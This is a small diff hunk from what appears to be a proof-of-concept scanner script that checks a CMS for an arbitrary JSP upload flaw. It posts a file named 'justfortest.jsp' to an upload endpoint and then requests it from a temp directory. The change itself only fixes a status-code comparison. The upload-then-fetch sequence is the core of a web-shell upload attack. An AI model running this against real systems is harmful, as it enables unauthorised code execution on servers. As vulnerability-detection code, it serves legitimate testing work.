@@ -38,7 +38,7 @@ class POC(Script):
                 for path in path_list:
                     myurl = path + 'cms/client/uploadpic_html.jsp?toname=justfortest.jsp&diskno=xxxx'
                     async with session.post(url=myurl, data=xmldata) as res:
-                        if res != None and res.status is 200:
+                        if res != None and res.status == 200:
                             myurl = path + 'cms-data/temp_dir/xxxx/temp.files/justfortest.jsp'
                             async with session.post(url=myurl, data=xmldata) as res:
                                 if res != None:
